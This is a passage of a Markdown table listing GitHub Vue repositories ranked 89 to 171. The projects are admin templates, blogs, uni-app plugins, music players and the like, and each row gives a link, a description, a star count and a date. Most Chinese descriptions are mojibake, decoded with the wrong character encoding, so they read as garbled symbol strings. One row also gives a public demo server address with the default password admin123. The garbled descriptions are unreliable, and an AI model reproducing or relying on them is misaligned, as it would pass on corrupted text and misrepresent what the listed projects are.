|89|[anjoy8/Blog.Admin](https://github.com/anjoy8/Blog.Admin)|‚ú® Âü∫‰∫évue ÁöÑÁÆ°ÁêÜÂêéÂè∞ÔºåÈÖçÂêàBlog.Core‰∏éBlog.VueÁ≠âÂ§ö‰∏™È°πÁõÆ‰ΩøÁî®|446|Vue|10/21|
|90|[ykfe/fe-dev-playbook](https://github.com/ykfe/fe-dev-playbook)|Êïô‰Ω†Â¶Ç‰ΩïÊâìÈÄ†ËàíÈÄÇ„ÄÅÈ´òÊïà„ÄÅÊó∂Â∞öÁöÑÂâçÁ´ØÂºÄÂèëÁéØÂ¢É|446|Vue|04/06|
|91|[woai3c/vue-admin-template](https://github.com/woai3c/vue-admin-template)|Vue ËΩªÈáèÁ∫ßÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂü∫Á°ÄÊ®°Êùø|436|Vue|08/30|
|92|[artiely/vue-admin-iview](https://github.com/artiely/vue-admin-iview)|vueÂêéÁ´ØÁÆ°ÁêÜÁ≥ªÁªüÁïåÈù¢ Âü∫‰∫éuiÁªÑ‰ª∂iview|425|Vue|04/30|
|93|[wsydxiangwang/Mood](https://github.com/wsydxiangwang/Mood)|VueÁöÑNuxt.jsÊúçÂä°Á´ØÊ∏≤ÊüìÊ°ÜÊû∂ÔºåNodeJS‰∏∫ÂêéÁ´ØÁöÑÂÖ®Ê†àÈ°πÁõÆÔºåDocker‰∏ÄÈîÆÈÉ®ÁΩ≤ÔºåÈù¢ÂêëÂ∞èÁôΩÁöÑÂÆåÁæéÂçöÂÆ¢Á≥ªÁªü|424|Vue|10/22|
|94|[lazzyfu/YaSQL](https://github.com/lazzyfu/YaSQL)|Âü∫‰∫éPythonÂºÄÂèëÁöÑMySQL WEBÁâàÊú¨ÁöÑÂ∑•ÂçïÂÆ°Ê†∏ÊâßË°åÂπ≥Âè∞|421|Vue|10/28|
|95|[pandaGao/bilibili-live-helper](https://github.com/pandaGao/bilibili-live-helper)|BilibiliÁõ¥Êí≠ÂºπÂπïÂ∫ì for Mac / Windows / Linux|413|Vue|09/05|
|96|[xiaowang1314/uniapp-plugin-collections](https://github.com/xiaowang1314/uniapp-plugin-collections)|uni-appÈ°πÁõÆÊèí‰ª∂ÂäüËÉΩÈõÜÂêàhttps://github.com/xiaowang1314/uniapp-plugin-collections|413|Vue|10/16|
|97|[TangSY/echarts-map-demo](https://github.com/TangSY/echarts-map-demo)|echartsÂú∞ÂõæËæπÁïåÊï∞ÊçÆÁöÑÂÆûÊó∂Ëé∑Âèñ‰∏éÂ∫îÁî®ÔºåÁúÅÂ∏ÇÂå∫ÂéøÂ§öÁ∫ßËÅîÂä®‰∏ãÈíªÔºåÁúüÊ≠£ÊÑè‰πâÁöÑ‰∏ãÈíªËá≥ÂéøÁ∫ß„ÄêÈôÑÊúÄÊñ∞geoJsonÊñá‰ª∂‰∏ãËΩΩ„Äë|405|Vue|10/28|
|98|[19920625lsg/spring-boot-online-exam](https://github.com/19920625lsg/spring-boot-online-exam)|Âü∫‰∫éSpring BootÁöÑÂú®Á∫øËÄÉËØïÁ≥ªÁªü(È¢ÑËßàÂú∞ÂùÄ http://129.211.88.191 ÔºåË¥¶Êà∑ÂàÜÂà´ÊòØadmin„ÄÅteacher„ÄÅstudentÔºåÂØÜÁ†ÅÊòØadmin123)|403|Vue|10/26|
|99|[powerdong/Music-player](https://github.com/powerdong/Music-player)|VueÈ´ò‰ªøÁΩëÊòì‰∫ëÈü≥‰πê(VueÂÖ•Èó®ÂÆûË∑µ)‚Äî‚ÄîÂú®Á∫øÈ¢ÑËßà -- ÊöÇÊó∂ÂÅúÊ≠¢|396|Vue|09/11|
|100|[bigbaser/Tcloud](https://github.com/bigbaser/Tcloud)|Tcloud‰∫ëÊµãÂπ≥Âè∞ÂâçÁ´ØÔºåÊñ∞Âú∞ÂùÄÔºöhttps://github.com/JunManYuanLong/Tcloud|395|Vue|08/04|
|101|[infinityu/mina-wear-mask](https://github.com/infinityu/mina-wear-mask)|Â§¥ÂÉèÂä†Âè£ÁΩ©Â∞èÁ®ãÂ∫è - Âü∫‰∫éuniapp‰ΩøÁî®vueÂø´ÈÄüÂÆûÁé∞|392|Vue|07/09|
|102|[wjkang/d2-admin-pm](https://github.com/wjkang/d2-admin-pm)|Âü∫‰∫é d2-adminÁöÑRBACÊùÉÈôêÁÆ°ÁêÜËß£ÂÜ≥ÊñπÊ°à|387|Vue|09/04|
|103|[leadream/wedding-invitation-for-programmers](https://github.com/leadream/wedding-invitation-for-programmers)|Á®ãÂ∫èÁåøÁöÑÂ©öÁ§ºÈÇÄËØ∑ÂáΩ„ÄÇ|376|Vue|10/13|
|104|[YaoZeyuan/stablog](https://github.com/YaoZeyuan/stablog)|Á®≥ÈÉ®ËêΩ. ‰∏ì‰∏öÂ§á‰ªΩÂØºÂá∫ÂæÆÂçöËÆ∞ÂΩï, Á®≥!|372|Vue|07/07|
|105|[hql7/tree-transfer](https://github.com/hql7/tree-transfer)|‰∏Ä‰∏™Âü∫‰∫évueÂíåelement-uiÁöÑÊ†ëÂΩ¢Á©øÊ¢≠Ê°ÜÂèäÈÇÆ‰ª∂ÈÄöËÆØÂΩï„ÄÇA tree shaped shuttle box assembly based on Vue and element-ui.  Vuecli3ÁâàÊú¨ËßÅhttps://github.com/hql7/wl-tree-transfer  Á§∫‰æãËßÅ->|371|Vue|10/26|
|106|[bingo-oss/bui-weex](https://github.com/bingo-oss/bui-weex)|‰∏ìÈó®‰∏∫ Weex ÂâçÁ´ØÂºÄÂèëËÄÖÊâìÈÄ†ÁöÑ‰∏ÄÂ•óÈ´òË¥®ÈáèUIÊ°ÜÊû∂|371|Vue|10/27|
|107|[CNOliverZhang/PotatofieldImageToolkit](https://github.com/CNOliverZhang/PotatofieldImageToolkit)|‰∏Ä‰∏™ÈÄÇÁî®‰∫éÊëÑÂΩ±‰ªé‰∏öËÄÖ/Áà±Â•ΩËÄÖ„ÄÅËÆæËÆ°Â∏àÁ≠âÂàõÊÑèË°å‰∏ö‰ªé‰∏öËÄÖÁöÑÂõæÂÉèÂ∑•ÂÖ∑ÁÆ±„ÄÇ|369|Vue|10/11|
|108|[hilanmiao/LanMiaoDesktop](https://github.com/hilanmiao/LanMiaoDesktop)|‰∏Ä‰∏™ÂÆåÊï¥electronÊ°åÈù¢ËÆ∞Ë¥¶Á®ãÂ∫èÔºåÊäÄÊúØÊ†à‰∏ªË¶Å‰ΩøÁî®electron-vue+vuetify„ÄÇÂºÄÊú∫Ëá™Âä®ÂêØÂä®ÔºåËá™Âä®Êõ¥Êñ∞ÔºåÊâòÁõòÊúÄÂ∞èÂåñÔºåÈó™ÁÉÅÁ≠âÂ∏∏Áî®ÂäüËÉΩÔºåNsisÂà∂‰ΩúÊºÇ‰∫ÆÁöÑÂÆâË£ÖÂåÖ„ÄÇ|366|Vue|09/12|
|109|[Neveryu/vue-cms](https://github.com/Neveryu/vue-cms)|Âü∫‰∫é Vue Âíå ElementUI ÊûÑÂª∫ÁöÑ‰∏Ä‰∏™‰ºÅ‰∏öÁ∫ßÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|362|Vue|10/26|
|110|[wechat-miniprogram/kbone-ui](https://github.com/wechat-miniprogram/kbone-ui)|kbone-ui ÊòØ‰∏ÄÂ•óËÉΩÂêåÊó∂ÊîØÊåÅ Â∞èÁ®ãÂ∫è(kbone) Âíå vue Ê°ÜÊû∂ÂºÄÂèëÁöÑÂ§öÁ´Ø UI Â∫ì|359|Vue|09/22|
|111|[TruthHun/BookChatApp](https://github.com/TruthHun/BookChatApp)|ÈÄöÁî®‰π¶Á±çÈòÖËØªAPPÔºåBookChat ÁöÑ uni-app ÂÆûÁé∞ÁâàÊú¨ÔºåÊîØÊåÅÂ§öÁ´ØÂàÜÂèëÔºåÁºñËØëÁîüÊàêAndroidÂíåiOS ÊâãÊú∫APP‰ª•ÂèäÂêÑÂπ≥Âè∞ÁöÑÂ∞èÁ®ãÂ∫è|358|Vue|05/13|
|112|[zhaoyiming0803/VueNode](https://github.com/zhaoyiming0803/VueNode)|VueNode ÊòØ‰∏ÄÂ•óÂü∫‰∫é TypeScript + Vue.js + Node.js + MySQL ÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÈ°πÁõÆ„ÄÇ|358|Vue|09/18|
|113|[TyCoding/tumo-vue](https://github.com/TyCoding/tumo-vue)|Tumo Blog For Vue.js. ÂâçÂêéÁ´ØÂàÜÁ¶ª|356|Vue|07/28|
|114|[iamdarcy/hioshop-admin](https://github.com/iamdarcy/hioshop-admin)|Êµ∑È£éÂ∞èÂ∫ó,ÂºÄÊ∫êÂïÜÂüé,ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÁÆ°ÁêÜÂêéÂè∞,ÂêéÂè∞ÁÆ°ÁêÜ,VUE|348|Vue|09/11|
|115|[yangyuji/h5-factory](https://github.com/yangyuji/h5-factory)|h5Âà∂‰ΩúÔºåÁßªÂä®Á´Ø‰∏ìÈ¢òÊ¥ªÂä®È°µÈù¢ÂèØËßÜÂåñÁºñËæë|346|Vue|03/18|
|116|[Hzy0913/mpvue-calendar](https://github.com/Hzy0913/mpvue-calendar)|üìÖ ÂæÆ‰ø°Â∞èÁ®ãÂ∫è/ÊµèËßàÂô®Á´Ø vue calendar Êó•ÂéÜÁªÑ‰ª∂mpvue-calendar Âü∫‰∫émpvueÂπ≥Âè∞ ÊîØÊåÅÂÜúÂéÜ„ÄÅÊåâÂë®ÂàáÊç¢„ÄÅÂèØËá™ÂÆö‰πâ„ÄÇüéâüéâÁé∞Â∑≤ÂèØ‰ª•ÂêåÊó∂Âú®ÊµèËßàÂô®Á´Ø‰ΩøÁî®|344|Vue|09/09|
|117|[bullteam/zeus-admin](https://github.com/bullteam/zeus-admin)|ZeusÂü∫‰∫éGolang Gin +casbinÔºåËá¥Âäõ‰∫éÂÅö‰ºÅ‰∏öÁªü‰∏ÄÊùÉÈôê&Ë¥¶Âè∑‰∏≠ÂøÉÁÆ°ÁêÜÁ≥ªÁªü„ÄÇÂåÖÂê´Ë¥¶Âè∑ÁÆ°ÁêÜÔºåÊï∞ÊçÆÊùÉÈôêÔºåÂäüËÉΩÊùÉÈôêÔºåÂ∫îÁî®ÁÆ°ÁêÜÔºåÂ§öÊï∞ÊçÆÂ∫ìÈÄÇÈÖçÔºåÂèØdocker ‰∏ÄÈîÆËøêË°å„ÄÇÁ§æÂå∫Ê¥ªË∑ÉÔºåÁâàÊú¨Ëø≠‰ª£Âø´ÔºåÂä†Áæ§ÂÖçË¥πÊäÄÊúØÊîØÊåÅ„ÄÇ|339|Vue|10/28|
|118|[lentoo/vue-admin](https://github.com/lentoo/vue-admin)|‰ΩøÁî® vue-cli3 Êê≠Âª∫ÁöÑvue-vuex-router-element ÂºÄÂèëÊ®°ÁâàÔºåÈõÜÊàêÂ∏∏Áî®ÁªÑ‰ª∂ÔºåÂäüËÉΩÊ®°Âùó|338|Vue|09/07|
|119|[anjoy8/Blog.Vue](https://github.com/anjoy8/Blog.Vue)|‚òò ‰∏Ä‰∏™vueÁöÑ‰∏™‰∫∫ÂçöÂÆ¢È°πÁõÆÔºåÈÖçÂêà.net core apiÊïôÁ®ãÔºåÊâìÈÄ†ÂâçÂêéÁ´ØÂàÜÁ¶ª|336|Vue|09/15|
|120|[vincentzyc/form-design](https://github.com/vincentzyc/form-design)|Âä®ÊÄÅË°®ÂçïÈ°µÈù¢ËÆæËÆ°--Ëá™Âä®ÁîüÊàêÈ°µÈù¢|332|Vue|10/30|
|121|[HuberTRoy/vue-shiyanlou](https://github.com/HuberTRoy/vue-shiyanlou)|:kissing_heart:Âü∫‰∫évue2ÂíåvuexÁöÑÂ§çÊùÇÂçïÈ°µÈù¢Â∫îÁî®Ôºå20+È°µÈù¢53‰∏™APIÔºà‰ªøÂÆûÈ™åÊ•ºÔºâ:sparkles::sparkles:|327|Vue|10/15|
|122|[ddiu8081/ChartFun](https://github.com/ddiu8081/ChartFun)|üé≤Êï∞ÊçÆÂ§ßÂ±èÂèØËßÜÂåñÁºñËæëÂô®|321|Vue|09/18|
|123|[IFmiss/vue-website](https://github.com/IFmiss/vue-website)|:cake: ÊÉ≥Áî®vueÊääÊàëÁé∞Âú®ÁöÑ‰∏™‰∫∫ÁΩëÁ´ôÈáçÊñ∞ÂÜô‰∏Ä‰∏ãÔºåÊñ∞ÁöÑÈ£éÊ†ºÔºåÊñ∞ÁöÑÊäÄÊúØÔºå‰ªÄ‰πàÈÉΩÊòØÊñ∞ÁöÑÔºÅ|319|Vue|09/04|
|124|[OXOYO/X-WebDesktop-Vue](https://github.com/OXOYO/X-WebDesktop-Vue)|Âü∫‰∫é Vue & Koa ÁöÑ WebDesktop ËßÜÁ™óÁ≥ªÁªü   The WebDesktop system based on Vue|318|Vue|10/20|
|125|[meloalright/vue-ins-progress-bar](https://github.com/meloalright/vue-ins-progress-bar)|‰∏ÄÊ¨æ ins È£éÊ†ºÁöÑ vue ËøõÂ∫¶Êù°ÁªÑ‰ª∂|314|Vue|09/28|
|126|[jackchen0120/vueDataV](https://github.com/jackchen0120/vueDataV)|Âü∫‰∫éVue + Echarts ÊûÑÂª∫ÁöÑÊï∞ÊçÆÂèØËßÜÂåñÂπ≥Âè∞ÔºåÈÖ∑ÁÇ´Â§ßÂ±èÂ±ïÁ§∫Ê®°ÊùøÂíåÁªÑ‰ª∂Â∫ìÔºåÊåÅÁª≠Êõ¥Êñ∞ÂêÑË°åÂêÑ‰∏öÂÆûÁî®Ê®°ÊùøÂíåÁÇ´ÈÖ∑Â∞èÁªÑ‰ª∂„ÄÇ|312|Vue|09/12|
|127|[GeekPark/smeditor](https://github.com/GeekPark/smeditor)|‚úé Âü∫‰∫é Vue.js 2.0+ Áü≥Â¢®ÊñáÊ°£Ê†∑ÂºèÁöÑÂØåÊñáÊú¨ÁºñËæëÂô®ÁªÑ‰ª∂|310|Vue|09/08|
|128|[hql7/wl-micro-frontends](https://github.com/hql7/wl-micro-frontends)|Micro front end practical project tutorial. ÂæÆÂâçÁ´ØÈ°πÁõÆÂÆûÊàòvueÈ°πÁõÆ„ÄÇÂü∫‰∫évue3.0&qiankun2.0ËøõÈò∂ÁâàÔºöhttps://github.com/wl-ui/wl-mfe|308|Vue|09/11|
|129|[go-admin-team/go-admin-ui](https://github.com/go-admin-team/go-admin-ui)|Âü∫‰∫éGin + Vue + Element UIÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂâçÁ´ØÊ®°Âùó|304|Vue|10/28|
|130|[tower1229/Vue-Giant-Tree](https://github.com/tower1229/Vue-Giant-Tree)|üå≥ Â∑®Ê†ëÔºöÂü∫‰∫éztreeÂ∞ÅË£ÖÁöÑVueÊ†ëÂΩ¢ÁªÑ‰ª∂ÔºåËΩªÊùæÂÆûÁé∞Êµ∑ÈáèÊï∞ÊçÆÁöÑÈ´òÊÄßËÉΩÊ∏≤Êüì„ÄÇ|302|Vue|09/17|
|131|[huxiaocheng/vue-gn-components](https://github.com/huxiaocheng/vue-gn-components)|ËøôÈáåÊúâ‰∏Ä‰∫õÊ†áÂáÜÁªÑ‰ª∂Â∫ìÂèØËÉΩÊ≤°ÊúâÁöÑÂäüËÉΩÁªÑ‰ª∂ÔºåÂ∑≤ÊúâÁªÑ‰ª∂ÔºöÊîæÂ§ßÈïú„ÄÅÁ≠æÂà∞„ÄÅÂõæÁâáÊ†áÁ≠æ„ÄÅÊªëÂä®È™åËØÅ„ÄÅÂÄíËÆ°Êó∂„ÄÅÊ∞¥Âç∞„ÄÅÊãñÊãΩ„ÄÅÂ§ßÂÆ∂Êù•ÊâæËå¨„ÄÇ|296|Vue|09/11|
|132|[MrZHLF/vue-admin](https://github.com/MrZHLF/vue-admin)|vue-cli3.0ÂêéÂè∞ÁÆ°ÁêÜÊ®°Êùø|294|Vue|09/07|
|133|[JackWeiler/ktv-select_music-system](https://github.com/JackWeiler/ktv-select_music-system)|KTVÁÇπÊ≠åÁ≥ªÁªü,Âê´ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü(ÂÆåÊï¥Áâà)|294|Vue|08/21|
|134|[niefy/wx-manage](https://github.com/niefy/wx-manage)|üî•ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂåÖÂê´ÂÖ¨‰ºóÂè∑ËèúÂçïÁÆ°ÁêÜüóÑ„ÄÅËá™Âä®ÂõûÂ§çüó®„ÄÅÁ¥†ÊùêÁÆ°ÁêÜüìÇ„ÄÅÊ®°ÊùøÊ∂àÊÅØ‚òò„ÄÅÁ≤â‰∏ùÁÆ°ÁêÜü§π‚Äç‚ôÇÔ∏èÁ≠âÂäüËÉΩÔºåÂâçÂêéÁ´ØÈÉΩÂºÄÊ∫êÂÖçË¥πüõ©|293|Vue|10/01|
|135|[Tsuk1ko/bilibili-live-chat](https://github.com/Tsuk1ko/bilibili-live-chat)|üìΩÔ∏è Êó†ÂêéÁ´ØÁöÑ‰ªø YouTube Live Chat È£éÊ†ºÁöÑÁÆÄÊòì Bilibili ÂºπÂπïÂß¨|284|Vue|10/13|
|136|[mizuka-wu/vue2-verify](https://github.com/mizuka-wu/vue2-verify)|vueÁöÑÈ™åËØÅÁ†ÅÊèí‰ª∂|281|Vue|09/08|
|137|[rogeraabbccdd/Fadacai-Generator](https://github.com/rogeraabbccdd/Fadacai-Generator)|Ë∑üËëóÈüìÁ∏Ω‰∏ÄËµ∑ËÆìÈ´òÈõÑÁôºÂ§ßË≤°!|281|Vue|09/09|
|138|[scscms/vue-scscms](https://github.com/scscms/vue-scscms)|Âü∫‰∫ékoa2+mysql+vue2.0+ElementÈò≥ÂÖâÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåÊ®°ËåÉÂ≠¶‰π†Demo|277|Vue|04/12|
|139|[MPComponent/mpvue-weui](https://github.com/MPComponent/mpvue-weui)|Âü∫‰∫é mpvue ÁöÑ weui Ê°ÜÊû∂|275|Vue|09/06|
|140|[daoket/vue.news](https://github.com/daoket/vue.news)|È°πÁõÆÂú∞ÂùÄ|274|Vue|09/10|
|141|[qq50032660/shopping_pro](https://github.com/qq50032660/shopping_pro)|uniapp ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚ÄîÂïÜÂüéÊ®°Áâà|273|Vue|09/07|
|142|[fujiazhang/Music-For-The-Poor](https://github.com/fujiazhang/Music-For-The-Poor)|VueÊäÄÊúØÊ†à ÊâìÈÄ†Á≤æÁæéÈü≥‰πêWebApppÔºå‰∏îËÉΩÂê¨‰ªòË¥πÊ≠åÊõ≤ÔºàÊØîÂ¶ÇÂë®Êù∞‰º¶Á≠âÔºâÔºåÊèê‰æõ‰ºòÈõÖÁöÑÁî®Êà∑‰ΩìÈ™å„ÄÇ‰ªøÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅ‰ªøQQÈü≥‰πê„ÄÅvueÈü≥‰πêÊí≠ÊîæÂô®„ÄÅmusic player„ÄÇ|269|Vue|09/17|
|143|[d2-projects/d2-crud](https://github.com/d2-projects/d2-crud)|D2 Crud ÊòØ‰∏Ä‰∏™Âü∫‰∫é Vue.js Âíå Element UI ÁöÑË°®Ê†ºÁªÑ‰ª∂ÔºåÂ∞ÅË£Ö‰∫ÜÂ∏∏Áî®ÁöÑË°®Ê†ºÊìç‰Ωú„ÄÇ|268|Vue|09/10|
|144|[allan2coder/VUE2-SPA-Tutorial](https://github.com/allan2coder/VUE2-SPA-Tutorial)|Vue2.xÔºàÂç≥Â∞ÜÂçáVue 3Ôºâ„ÄÅ Webpack 4.x„ÄÅBabel 7.x|268|Vue|06/24|
|145|[kouchao/vue-layui](https://github.com/kouchao/vue-layui)|Âü∫‰∫évueÁöÑlayui|266|Vue|09/05|
|146|[bestaone/HiAuth](https://github.com/bestaone/HiAuth)|HiAuthÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÂü∫‰∫éOauth2ÂçèËÆÆÁöÑËÆ§ËØÅ„ÄÅÊéàÊùÉÁ≥ªÁªü„ÄÇ|256|Vue|10/29|
|147|[SNFocus/approvalFlow](https://github.com/SNFocus/approvalFlow)|Âü∫‰∫éform-generatorÔºå‰ªøÈíâÈíâÂÆ°ÊâπÊµÅÁ®ãÂàõÂª∫ÔºàË°®ÂçïÂàõÂª∫/ÊµÅÁ®ãËäÇÁÇπÂèØËßÜÂåñÈÖçÁΩÆ/ÂøÖÂ°´Êù°‰ª∂ÂèäÊ†°È™åÔºâ|256|Vue|10/23|
|148|[linjinze999/vue-llplatform](https://github.com/linjinze999/vue-llplatform)|vue-llplatformÔºåÂü∫‰∫évue„ÄÅelementÊê≠Âª∫ÁöÑÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞„ÄÇ|249|Vue|09/09|
|149|[CS-Tao/whu-library-seat](https://github.com/CS-Tao/whu-library-seat)|Ê≠¶Ê±âÂ§ßÂ≠¶Âõæ‰π¶È¶ÜÂä©Êâã - Ê°åÈù¢Á´Ø|248|Vue|10/24|
|150|[xusenlin/vue-element-ui-admin](https://github.com/xusenlin/vue-element-ui-admin)|:maple_leaf:  ‰∏Ä‰∏™Âü∫‰∫é Vue Element UI ÁöÑÂêéÂè∞Ê®°ÊùøÔºåÂÅö‰∫ÜÁõÆÂΩïÁªìÊûÑÁöÑÊï¥ÁêÜÂíåÂ∏∏Áî®ÊñπÊ≥ïÁöÑÂ∞ÅË£ÖÔºåÂºÄÁÆ±Âç≥Áî® :)|247|Vue|09/21|
|151|[wuyawei/webrtc-stream](https://github.com/wuyawei/webrtc-stream)|üçßüç≠üòªÂåÖÊã¨‰ΩÜ‰∏çÂ±ÄÈôê‰∫é WebRTC ÁöÑÂêÑÁßçÊ†óÂ≠ê|246|Vue|09/07|
|152|[wx-chevalier/Web-Series](https://github.com/wx-chevalier/Web-Series)|:books: Áé∞‰ª£ Web ÂºÄÂèëÔºåÁé∞‰ª£ Web ÂºÄÂèëÂØºËÆ∫   Âü∫Á°ÄÁØá   ËøõÈò∂ÁØá   Êû∂ÊûÑ‰ºòÂåñÁØá   React ÁØá   Vue ÁØá|245|Vue|10/29|
|153|[daoshengfu/Vue-NeteaseCloud-WebMusicApp](https://github.com/daoshengfu/Vue-NeteaseCloud-WebMusicApp)|VueÈ´ò‰ªøÁΩëÊòì‰∫ëÈü≥‰πêÔºåÂü∫Êú¨ÂÆûÁé∞ÁΩëÊòì‰∫ëÊâÄÊúâÈü≥‰πê„ÄÅMVÁõ∏ÂÖ≥ÂäüËÉΩÔºåÁé∞Â∑≤Êõ¥Êñ∞Âà∞Á¨¨‰∫åÁâàÔºå‰ªÖÁî®‰∫éÂ≠¶‰π†Ôºå‰∏ãÈù¢ÊúâËØ¶ÁªÜÊïôÁ®ã„ÄÇ |245|Vue|10/18|
|154|[YXJ2018/SpringBoot-Vue-OnlineExam](https://github.com/YXJ2018/SpringBoot-Vue-OnlineExam)|Âú®Á∫øËÄÉËØïÁ≥ªÁªüÔºåspringboot+vueÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∏Ä‰∏™È°πÁõÆÔºåËÆ∞ÂΩïËá™Â∑±ÊØï‰∏öËÆæËÆ°ÂÆåÊàêÁöÑÊÉÖÂÜµ|243|Vue|09/07|
|155|[chaohangz/vueBlog](https://github.com/chaohangz/vueBlog)|vue + node + express + mongodb  ‰∏™‰∫∫ÂçöÂÆ¢Á≥ªÁªü|242|Vue|10/27|
|156|[zhuyihe/vue-admin-project](https://github.com/zhuyihe/vue-admin-project)|vue-cli3Êê≠Âª∫ÂêéÂè∞ÁÆ°ÁêÜÊ®°Êùø|241|Vue|09/16|
|157|[Tencent/WeComponents](https://github.com/Tencent/WeComponents)|Âü∫‰∫éÈÄöÁî®ÁªÑ‰ª∂ËØ≠Ë®ÄËßÑËåÉ (CLS) ÂÆûÁé∞ÁöÑ Vue.js Â£∞ÊòéÂºèÁªÑ‰ª∂Â∫ì|233|Vue|06/27|
|158|[ssshooter/img-vuer](https://github.com/ssshooter/img-vuer)|An Mobile-First image viewer for Vue2  / ‰∏Ä‰∏™ÁßªÂä®Á´Ø‰ºòÂÖàÁöÑ Vue2 ÂõæÁâáÈ¢ÑËßàÊèí‰ª∂|233|Vue|09/07|
|159|[Acmenlei/Many-people-blog](https://github.com/Acmenlei/Many-people-blog)|üéàÂü∫‰∫évue+node+mysqlÁöÑÂ§ö‰∫∫ÂçöÂÆ¢ÔºåÂ∏¶ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü„ÄÇÊîØÊåÅÔºöÁôªÈôÜ/Ê≥®ÂÜåÔºåÁïôË®ÄÔºåËØÑËÆ∫/ÂõûÂ§çÔºåÁÇπËµûÔºåËÆ∞ÂΩïÊµèËßàÊï∞ÈáèÔºåÂ∏¶ÊúâÁõ∏ÂÜåÂäüËÉΩÔºåÂÜÖÂÆπ‰∏∞ÂØåÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ÂèëË°®ÊñáÁ´†„ÄÇÊ¨¢Ëøé‰ΩøÁî®ÔºÅ|231|Vue|09/30|
|160|[qiuChengleiy/shop-vue](https://github.com/qiuChengleiy/shop-vue)|  vue-cli + vue-router + vuex + axios + vue-axios + vant( UI )  ÁßªÂä®Á´ØÂïÜÂüé APPÈ°πÁõÆ |230|Vue|04/08|
|161|[2017coding/BBS_admin](https://github.com/2017coding/BBS_admin)|vue+ElementUI+axios Êé•ÂÖ•Êï∞ÊçÆÔºå‰ªøsegmentfaultÔºåÂÅöÁõ∏ÂÖ≥ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü https://lyh.red/admin/|228|Vue|09/04|
|162|[arkntools/arknights-toolbox](https://github.com/arkntools/arknights-toolbox)|üî® Arknights Toolbox, all servers are supported. ÊòéÊó•ÊñπËàüÂ∑•ÂÖ∑ÁÆ±ÔºåÊîØÊåÅ‰∏≠Âè∞Êó•Èü©ÂõΩÈôÖÊúç|216|Vue|10/28|
|163|[QinZhen001/didi](https://github.com/QinZhen001/didi)|:car: mpvueÊ°ÜÊû∂‰ªøÊª¥Êª¥Âá∫Ë°åÂæÆ‰ø°Â∞èÁ®ãÂ∫è|215|Vue|04/03|
|164|[momosecurity/bombus](https://github.com/momosecurity/bombus)|ÂêàËßÑÂÆ°ËÆ°Âπ≥Âè∞|214|Vue|10/15|
|165|[livegbs/GB28181-Server](https://github.com/livegbs/GB28181-Server)|LiveGBSÂõΩÊ†á(GB28181)ÊµÅÂ™í‰ΩìÊúçÂä°ËΩØ‰ª∂Ôºö Êèê‰æõÁî®Êà∑ÁÆ°ÁêÜÂèäWebÂèØËßÜÂåñÈ°µÈù¢ÁÆ°ÁêÜÔºõ Êèê‰æõËÆæÂ§áÁä∂ÊÄÅÁÆ°ÁêÜÔºåÂèØÂÆûÊó∂Êü•ÁúãËÆæÂ§áÊòØÂê¶ÊéâÁ∫øÁ≠â‰ø°ÊÅØÔºõ ÂÆûÊó∂ÊµÅÂ™í‰ΩìÂ§ÑÁêÜÔºåPSÔºàTSÔºâËΩ¨ESÔºõ ËÆæÂ§áÁä∂ÊÄÅÁõëÊµã„ÄÅ‰∫ëÂè∞ÊéßÂà∂„ÄÅÂΩïÂÉèÊ£ÄÁ¥¢„ÄÅÂõûÊîæÔºõ Êèê‰æõRTSP„ÄÅRTMP„ÄÅHTTP-FLV„ÄÅHLSÁ≠âÂ§öÁßçÂçèËÆÆÊµÅËæìÂá∫Ôºõ ÂØπÂ§ñÊèê‰æõÊúçÂä°Âô®Ëé∑ÂèñÁä∂ÊÄÅ„ÄÅ‰ø°ÊÅØÔºåÊéßÂà∂Á≠âHTTP APIÊé•Âè£ÔºõÊîØÊåÅËØ≠Èü≥ÂØπËÆ≤ÔºõÊîØÊåÅ‰∫ëÁ´ØÂΩïÂÉèÔºõTCP„ÄÅUDP‰∏§ÁßçÊñπÂºè‰ø°‰ª§‰º†Ëæì‰ª•ÂèäUDP„ÄÅTCPË¢´Âä®„ÄÅTCP‰∏ªÂä®‰∏âÁßçËßÜÈ¢ëÊµÅ‰º†ËæìÊñπÂºèÔºõ|211|Vue|10/29|
|166|[xlogiccc/vue-picture-preview](https://github.com/xlogiccc/vue-picture-preview)|ÁßªÂä®Á´Ø„ÄÅPC Á´Ø Vue.js ÂõæÁâáÈ¢ÑËßàÊèí‰ª∂   Friendly picture file preview Vue.js plugin based on PhotoSwipe.|211|Vue|10/02|
|167|[tangjinzhou/geektime-vue-1](https://github.com/tangjinzhou/geektime-vue-1)|ÊûÅÂÆ¢Êó∂Èó¥Âü∫Á°ÄÁØá&ÁîüÊÄÅÁØá‰ª£Á†Å|211|Vue|09/08|
|168|[zuley/vue-color-picker](https://github.com/zuley/vue-color-picker)|Vue È¢úËâ≤ÈÄâÊã©Âô®Êèí‰ª∂|210|Vue|09/27|
|169|[StavinLi/Workflow](https://github.com/StavinLi/Workflow)|‰ªøÈíâÈíâÂÆ°ÊâπÊµÅÁ®ãËÆæÁΩÆ|210|Vue|06/10|
|170|[Sandop/NuxtPC](https://github.com/Sandop/NuxtPC)|Âü∫‰∫éNuxtÁöÑ‰ºÅ‰∏öÂÆòÁΩë|209|Vue|07/30|
|171|[CS-Tao/whu-library-seat-mobile](https://github.com/CS-Tao/whu-library-seat-mobile)|Ê≠¶Ê±âÂ§ßÂ≠¶Âõæ‰π¶È¶ÜÂä©Êâã - ÁßªÂä®Á´Ø|208|Vue|10/22|
